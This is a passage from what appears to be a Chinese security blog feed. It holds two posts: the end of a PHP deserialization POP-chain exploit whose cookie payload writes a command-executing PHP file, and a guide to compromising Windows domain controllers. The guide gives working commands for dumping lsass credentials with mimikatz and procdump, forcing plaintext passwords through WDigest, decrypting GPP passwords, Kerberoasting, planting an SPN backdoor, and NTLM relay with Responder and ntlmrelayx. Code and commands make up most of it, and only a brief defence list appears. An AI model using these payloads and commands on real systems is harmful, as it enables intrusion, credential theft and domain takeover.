class="line">&#125;;</span><br><span class="line">class User &#123;</span><br><span class="line">    static function addLyrics($lyrics) &#123;</span><br><span class="line">        $oldlyrics &#x3D; array();</span><br><span class="line">        if (isset($_COOKIE[&#39;lyrics&#39;])) &#123;</span><br><span class="line">            $oldlyrics &#x3D; unserialize(base64_decode($_COOKIE[&#39;lyrics&#39;]));</span><br><span class="line">        &#125;</span><br><span class="line">        foreach ($lyrics as $lyric) $oldlyrics []&#x3D; $lyric;</span><br><span class="line">        setcookie(&#39;lyrics&#39;, base64_encode(serialize($oldlyrics)));</span><br><span class="line">    &#125;</span><br><span class="line">    static function getLyrics() &#123;</span><br><span class="line">        if (isset($_COOKIE[&#39;lyrics&#39;])) &#123;</span><br><span class="line">            return unserialize(base64_decode($_COOKIE[&#39;lyrics&#39;]));</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            setcookie(&#39;lyrics&#39;, base64_encode(serialize(array(1, 2))));</span><br><span class="line">            return array(1, 2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">User::getLyrics();</span><br></pre></td></tr></table></figure><p>在进行反序列化漏洞的时候，我们需要找到可控的unserialize，这里发现$_COOKIE[‘lyrics’]参数可控，有了可控的参数，就需要找到魔术方法来自动调用，这里危险函数在LogWriter_File这个类，这时就需要构造POP链了。</p><p>首先来看魔术方法，在Lyrics类中存在两个魔术方法，发现对象在销毁的时候调用了$this-&gt;song-&gt;log()，而log方法又在Logger这个类中存在，所以属性$this-&gt;song应该为new Logger()。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class Lyrics &#123;</span><br><span class="line">    protected $lyrics;</span><br><span class="line">    protected $song;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;song &#x3D; new Logger();</span><br><span class="line">        $this-&gt;lyrics &#x3D; &#39;111&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __toString() &#123;</span><br><span class="line">        return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;&#x2F;p&gt;&lt;p&gt;&quot; . str_replace(&quot;\n&quot;, &quot;&lt;br &#x2F;&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;&#x2F;p&gt;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;song-&gt;log();</span><br><span class="line">    &#125;</span><br><span class="line">    function shortForm() &#123;</span><br><span class="line">        return &quot;&lt;p&gt;&lt;a href&#x3D;&#39;song.php?name&#x3D;&quot; . urlencode($this-&gt;song-&gt;get_name()) . &quot;&#39;&gt;&quot; . $this-&gt;song-&gt;get_name() . &quot;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function name_is($name) &#123;</span><br><span class="line">        return $this-&gt;song-&gt;get_name() &#x3D;&#x3D;&#x3D; $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>继续找，当实例化对象Lyricsde时，log方法存在$this-&gt;logwriter-&gt;writeLog，而writeLog又存在于LogWriter_File类中，这好这个类是我们的漏洞触发点，所以$this-&gt;logwriter应该为new LogWriter_Fil()，构造下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Logger &#123;</span><br><span class="line">    protected $logwriter;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;logwriter &#x3D; new LogWriter_File(&#39;123.php&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    function log($txt) &#123;</span><br><span class="line">        $this-&gt;logwriter-&gt;writeLog($txt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>实例化对象Logger之后，调用了LogWriter_File的writeLog方法，而写入文件的txt是通过$this-&gt;format-&gt;format获得，而format方法存在类LogFileFormat中，所以，构造如下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class LogWriter_File &#123;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $format;</span><br><span class="line">    function __construct($filename) &#123;</span><br><span class="line">        $this-&gt;filename &#x3D; str_replace(&quot;..&quot;, &quot;__&quot;, str_replace(&quot;&#x2F;&quot;, &quot;_&quot;, $filename));</span><br><span class="line">        $this-&gt;format &#x3D; new LogFileFormat();</span><br><span class="line">    &#125;</span><br><span class="line">    function writeLog($txt) &#123; &#x2F;&#x2F; 111</span><br><span class="line">        $txt &#x3D; $this-&gt;format-&gt;format($txt);</span><br><span class="line">        &#x2F;&#x2F;TODO: Modify the address here, and delete this TODO.</span><br><span class="line">        file_put_contents(&quot;D:\\phpStudy\\WWW\\ctf&quot; . $this-&gt;filename, $txt, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在类LogFileFormat中的format方法中利用$filter-&gt;filter来获取的$txt，而$filter是通过foreach获取的，所以$this-&gt;filters为一个数组，最终OutputFilter传入写入文件的内容，就可以构造如下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">class OutputFilter &#123;</span><br><span class="line">    protected $matchPattern;</span><br><span class="line">    protected $replacement;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;matchPattern &#x3D; &#39;&#x2F;&#x2F;&#39;;</span><br><span class="line">        $this-&gt;replacement &#x3D; &#39;&lt;?&#x3D; &#96;whoami&#96;?&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    function filter($data) &#123;</span><br><span class="line">        return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class LogFileFormat &#123;</span><br><span class="line">    protected $filters;</span><br><span class="line">    protected $endl;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;filters &#x3D; array(new OutputFilter());</span><br><span class="line">        $this-&gt;endl &#x3D; &#39;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    function format($txt) &#123; &#x2F;&#x2F; 111</span><br><span class="line">        foreach ($this-&gt;filters as $filter) &#123;</span><br><span class="line">            $txt &#x3D; $filter-&gt;filter($txt);</span><br><span class="line">            echo $txt;</span><br><span class="line">        &#125;</span><br><span class="line">        $txt &#x3D; str_replace(&#39;\n&#39;, $this-&gt;endl, $txt);</span><br><span class="line">        return $txt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最后，将payload组合起来，利用serialize输出下序列化的结果</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/4.png" alt="4" loading="lazy"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A6%3A%22Lyrics%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00lyrics%22%3Bs%3A3%3A%22111%22%3Bs%3A7%3A%22%00%2A%00song%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00logwriter%22%3BO%3A14%3A%22LogWriter_File%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A7%3A%22123.php%22%3Bs%3A9%3A%22%00%2A%00format%22%3BO%3A13%3A%22LogFileFormat%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22OutputFilter%22%3A2%3A%7Bs%3A15%3A%22%00%2A%00matchPattern%22%3Bs%3A2%3A%22%2F%2F%22%3Bs%3A14%3A%22%00%2A%00replacement%22%3Bs%3A14%3A%22%3C%3F%3D+%60whoami%60%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00endl%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure><p>在base64下通过cookie传入就可以写入ctf123.php了</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/5.png" alt="5" loading="lazy"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/</a></p><p>2.<a href="https://xz.aliyun.com/t/3674#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-9</a></p><p>3.<a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80" target="_blank" rel="noopener">https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;序列化与反序列化&quot;&gt;&lt;a href=&quot;#序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化&quot;&gt;&lt;/a&gt;&lt;strong&gt;序列化与反序列化&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在php中，使用serialize和unserialize
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>获取域控的方法</title>
    <link href="http://yoursite.com/2020/02/26/%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2020/02/26/%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95/</id>
    <published>2020-02-26T10:35:58.000Z</published>
    <updated>2020-02-26T10:48:00.083Z</updated>
    
    <content type="html"><![CDATA[<h4 id="高权限读取本地密码"><a href="#高权限读取本地密码" class="headerlink" title="高权限读取本地密码"></a><strong>高权限读取本地密码</strong></h4><p>当域管理员在域成员机器上登录进行工作的时候，会将明文密码保存在本地进行的lsass.exe，可以通过mimikatz来读取到本地的明文密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug  # 提权</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>如果主机存在杀软的时候，上传mimikatz很多时候都会被杀掉，可以通过<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener">procdump</a>+mimikatz的方式进行绕过。先导出lsass.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p>保存到本地，通过mimikatz读lsass.dmp的明文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;  &gt; 1.txt</span><br></pre></td></tr></table></figure><p>如果目标机器是windows server 2012，通过添加注册表，在通过锁屏，让管理员重新登录及可以读取明文。</p><p>添加注册表，设置UseLogonCredential设置为1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure><p>利用powershell脚本进行锁屏</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Function Lock-WorkStation </span><br><span class="line">&#123;</span><br><span class="line">$signature &#x3D; @&quot;</span><br><span class="line">[DllImport(&quot;user32.dll&quot;, SetLastError &#x3D; true)]</span><br><span class="line">public static extern bool LockWorkStation();</span><br><span class="line">&quot;@</span><br><span class="line">$LockWorkStation &#x3D; Add-Type -memberDefinition $signature -name &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru</span><br><span class="line">$LockWorkStation::LockWorkStation() | Out-Null</span><br><span class="line">&#125;</span><br><span class="line">Lock-WorkStation</span><br></pre></td></tr></table></figure><p>管理员重新登录后就可以抓取到明文密码了。</p><h4 id="SYSVOL还原组策略"><a href="#SYSVOL还原组策略" class="headerlink" title="SYSVOL还原组策略"></a><strong>SYSVOL还原组策略</strong></h4><p>在域环境中，有个默认的共享路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</span><br></pre></td></tr></table></figure><p>SYSVOL是活动目录存储文件服务副本的共享文件夹，里面包含有登录脚本，组策略数据等，域里的所有用户都能访问这个共享文件。在SYSVOL目录下，默认是没有groups.xml文件的，必须创建组策略脚本登录才有这个文件。在groups.xml文件中，密码是通过AES-256加密的，但是微软发布了AES的<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN" target="_blank" rel="noopener">私钥</a>。</p><p>可以利用powershell解密密文:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Get-DecryptedCpassword</span></span> &#123;</span><br><span class="line">    [<span class="type">CmdletBinding</span>()]</span><br><span class="line">    <span class="keyword">Param</span> (</span><br><span class="line">        [<span class="built_in">string</span>] <span class="variable">$Cpassword</span></span><br><span class="line">    )</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">#Append appropriate padding based on string length  </span></span><br><span class="line">        <span class="variable">$Mod</span> = (<span class="variable">$Cpassword</span>.length % <span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$Mod</span>) &#123;</span><br><span class="line">        <span class="string">'1'</span> &#123;<span class="variable">$Cpassword</span> = <span class="variable">$Cpassword</span>.Substring(<span class="number">0</span>,<span class="variable">$Cpassword</span>.Length <span class="literal">-1</span>)&#125;</span><br><span class="line">        <span class="string">'2'</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">'='</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">        <span class="string">'3'</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">'='</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$Base64Decoded</span> = [<span class="type">Convert</span>]::FromBase64String(<span class="variable">$Cpassword</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#Create a new AES .NET Crypto Object</span></span><br><span class="line">        <span class="variable">$AesObject</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.AesCryptoServiceProvider</span><br><span class="line">        [<span class="built_in">Byte</span>[]] <span class="variable">$AesKey</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x4e,<span class="number">0</span>x99,<span class="number">0</span>x06,<span class="number">0</span>xe8,<span class="number">0</span>xfc,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>xc9,<span class="number">0</span>xfa,<span class="number">0</span>xf4,<span class="number">0</span>x93,<span class="number">0</span>x10,<span class="number">0</span>x62,<span class="number">0</span>x0f,<span class="number">0</span>xfe,<span class="number">0</span>xe8,</span><br><span class="line">                             <span class="number">0</span>xf4,<span class="number">0</span>x96,<span class="number">0</span>xe8,<span class="number">0</span>x06,<span class="number">0</span>xcc,<span class="number">0</span>x05,<span class="number">0</span>x79,<span class="number">0</span>x90,<span class="number">0</span>x20,<span class="number">0</span>x9b,<span class="number">0</span>x09,<span class="number">0</span>xa4,<span class="number">0</span>x33,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>x1b)</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#Set IV to all nulls to prevent dynamic generation of IV value</span></span><br><span class="line">        <span class="variable">$AesIV</span> = <span class="built_in">New-Object</span> Byte[](<span class="variable">$AesObject</span>.IV.Length) </span><br><span class="line">        <span class="variable">$AesObject</span>.IV = <span class="variable">$AesIV</span></span><br><span class="line">        <span class="variable">$AesObject</span>.Key = <span class="variable">$AesKey</span></span><br><span class="line">        <span class="variable">$DecryptorObject</span> = <span class="variable">$AesObject</span>.CreateDecryptor() </span><br><span class="line">        [<span class="built_in">Byte</span>[]] <span class="variable">$OutBlock</span> = <span class="variable">$DecryptorObject</span>.TransformFinalBlock(<span class="variable">$Base64Decoded</span>, <span class="number">0</span>, <span class="variable">$Base64Decoded</span>.length)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> [<span class="type">System.Text.UnicodeEncoding</span>]::Unicode.GetString(<span class="variable">$OutBlock</span>)</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>]&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Get-DecryptedCpassword</span> <span class="string">"I0vK3Yj0SeoHQDxF5skcjt3BOkMZmX6IiqRVKCTo4Z4"</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/1.png" alt="" loading="lazy"></p><p>针对SYSOVL的防御：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.打补丁KB2962486</span><br><span class="line">2.删除SYSVOL目录下的groups.xml</span><br><span class="line">3.设置共享文件SYSVOL的权限</span><br></pre></td></tr></table></figure><h4 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a><strong>Kerberoasting</strong></h4><p>SPN为服务主体名称，是服务实列(MSSQL,HTTP等)的唯一标识，如果在林中安装服务的多个实列，每个实列都有自己的SPN，如果kerberos服务票证的加密类型为RC4_HMAC_MD5，就可以导出TGS对其进行离线破解，获取到域用户的密码了。</p><p>使用setspn查询spn(windows7和server2008默认自带)</p><p>查询域内所有的SPN和查询test域的SPN</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -q *&#x2F;*</span><br><span class="line">setspn.exe -T test.com -q *&#x2F;*</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/2.png" alt="" loading="lazy"></p><p>以CN开头的为代表一个账号，机器账号为Computers，域用户账号为Users</p><p>查询域内注册的spn（kerberoast）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript GetUserSPNs.vbs</span><br></pre></td></tr></table></figure><p>PowerView</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure><p>给MSSQL服务注册SPN</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -A MSSQLSvc&#x2F;WIN-M34UCFJIPNQ.test.com test.com\fanxing</span><br></pre></td></tr></table></figure><p>将kerberos的加密方式换成RC4_HMAC_MD5</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/3.png" alt="" loading="lazy"></p><p>请求指定的TGS，完成之后klist就能查看相应的票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$SPNName &#x3D; &#39;MSSQLSvc&#x2F;WIN-M34UCFJIPNQ.test.com&#39;</span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/4.png" alt="" loading="lazy"></p><p>mimikatz导出票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list &#x2F;export</span><br></pre></td></tr></table></figure><p>使用<a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">tgsrepcrack.py</a>破解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tgsrepcrack.py wordlist.txt mssql.kirbi</span><br></pre></td></tr></table></figure><p><strong>kerberoasting后门利用</strong></p><p>在获取到spn的修改权限后，可以给指定的域用户注册spn，可以获取到任意域用户的TGS进行离线破解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -U -A VNC&#x2F;WIN-M34UCFJIPNQ.test.com Administrator</span><br></pre></td></tr></table></figure><h4 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a><strong>重放攻击</strong></h4><p>在NTML认证的过程中，数据包传递的是NTML-Hash加密的16位的challenge随机数得到的Net-NTML</p><p> Hash，如果存在中间人的情况，就可以通过hash进行重放攻击，下面简述下存在中间人，NTML协议过程：</p><p><img src="https://p1.ssl.qhimg.com/t01f22f78b71df16680.png" alt="" loading="lazy"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.当客户端对服务端发起请求，客户端并不知道中间人存在，所以把请求发送给了中间人。中间人拿着这个请求发送给服务端，服务端以为是客户端发来的请求。</span><br><span class="line">2.进过验证后，会生成一个随机数(challenge)返回给攻击者，服务端保存的ntmlhash进行DES加密challenge(chal</span><br><span class="line">lenge1)，攻击者拿着这个challenge明文发送给客户端。</span><br><span class="line">3.客户端对这个challenge用自己的密码进行DES加密(response)，发送给中间人，中间人在将这个请求发送给服务端。</span><br><span class="line">4.服务端拿到这个response跟之前加密的challenge1进行对比，一样的话就验证成功。</span><br></pre></td></tr></table></figure><p>在进行ntml中间人攻击的时候，要避免最小的网络流量，所以使用的比较多的也是LLMNR/NetNS欺骗。</p><p>在两台windows进行进行资源请求的时候，对机器的解析顺序为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.HOSTS文件(c:&#x2F;windows&#x2F;system32&#x2F;driver&#x2F;etc&#x2F;hosts)</span><br><span class="line">2.本地的DNS缓存(ipconfig &#x2F;displaydns)</span><br><span class="line">3.dns服务器</span><br><span class="line">4.LLMNR</span><br><span class="line">5.NetBios-NS</span><br></pre></td></tr></table></figure><h5 id="SMB中继"><a href="#SMB中继" class="headerlink" title="SMB中继"></a>SMB中继</h5><p>对于smb中继的利用条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.不能开启smb签名，而在域内，域控上面是开启了签名的，域成员机器是没有开启的。</span><br><span class="line">2.打了ms08-068补丁的xp&#x2F;2003系统也无法利用</span><br></pre></td></tr></table></figure><p>首先利用nmap探测是否开启了签名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p 445 --open --script smb-security-mode,smb-os-discovery 192.168.50.241</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/5.png" alt="" loading="lazy"></p><h5 id="Responder-ntmlrelayx"><a href="#Responder-ntmlrelayx" class="headerlink" title="Responder+ntmlrelayx"></a>Responder+ntmlrelayx</h5><p>获取ntmlv2 hash，在攻击机执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0 -v      #假设ip为192.168.50.64</span><br></pre></td></tr></table></figure><p>在任意机器上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.50.64\c$</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/6.png" alt="" loading="lazy"></p><p>当使用ntmlrelayx进行重放攻击的时候，需要在Responder.conf设置SMB和HTTP服务为Off</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0 -v    # 启动Responder，假设ip为192.168.50.64</span><br><span class="line">python ntlmrelayx.py -t 192.168.50.241   # -t为受害者，进行中继攻击</span><br><span class="line">net use192.168.50.64\c$ &quot;fx@123.com&quot; &#x2F;user:&quot;administrator&quot;   # 攻击机执行</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/7.png" alt="" loading="lazy"></p><h5 id="smbrelayx"><a href="#smbrelayx" class="headerlink" title="smbrelayx"></a>smbrelayx</h5><p>使用smbrelayx和ntmlrelayx都是利用的<a href="https://github.com/CoreSecurity/impacket.git" target="_blank" rel="noopener">impacket</a>，环境配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install pycrypto    # 安装加密库</span><br><span class="line">apt-get --reinstall install python-pyasn1 python-pyasn1-modules</span><br><span class="line">cd impacket&#x2F;</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><p>在攻击机进行重放攻击</p><figure class="highlight plain"><table><tr><td 